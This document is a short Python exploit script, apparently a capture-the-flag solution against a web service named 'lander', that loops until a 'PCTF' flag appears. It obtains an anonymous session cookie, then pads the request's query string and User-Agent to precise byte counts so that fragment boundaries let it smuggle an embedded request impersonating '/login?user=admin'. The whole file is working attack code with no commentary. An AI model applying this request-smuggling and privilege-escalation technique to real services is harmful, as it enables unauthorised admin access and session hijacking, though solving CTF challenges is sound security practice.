#!/usr/bin/env python3

import requests

public_ip = "192.168.64.1"
host = "lander:8080"
url = f"http://{host}"

# payload bytes per fragment
bpf_1 = 3893
bpf_2 = 3915

# get session cookie
session = requests.Session()
session.get(f"{url}/login?user=anonymous")
cookie = session.cookies.get_dict()["session"]

# contents of first fragment:
prefix_1 = '{"Method":"GET","Status":0,"URL":"' + url + "/data?"
suffix_1 = '","Headers":'

# contents of second fragment:
prefix_2 = (
    '{"Accept":"*/*","Accept-Encoding":"gzip, deflate","Cookie":"session='
    + cookie
    + '","Method":"GET","Session":"'
    + cookie
    + '","Url":"'
    + url
    + '/login?user=admin","User-Agent":"'
)
suffix_2 = (
    '","X-Forwarded-For":"'
    + public_ip
    + '","X-Forwarded-Host":"'
    + host
    + '","X-Forwarded-Port":"8080","X-Forwarded-Proto":"http","X-Forwarded-Server":"000000000000","X-Real-Ip":"'
    + public_ip
    + '"}'
)

# build headers for embedded request object
headers = {
    "Method": "GET",
    "User-Agent": "a" * (bpf_2 - (len(prefix_2) + len(suffix_2))),
    "URL": f"{url}/login?user=admin",
    "Session": cookie,
    "Cookie": f"session={cookie}",
}

i = 0
while True:
    # should take no more than ~30 requests
    print(f"attempt {i}...")
    i += 1
    try:
        resp = session.get(
            f"{url}/data?{'b' * (bpf_1 - (len(prefix_1)+len(suffix_1)))}",
            headers=headers,
        )
        if "PCTF" in resp.text:
            print(resp.text)
            break
    except:
        continue
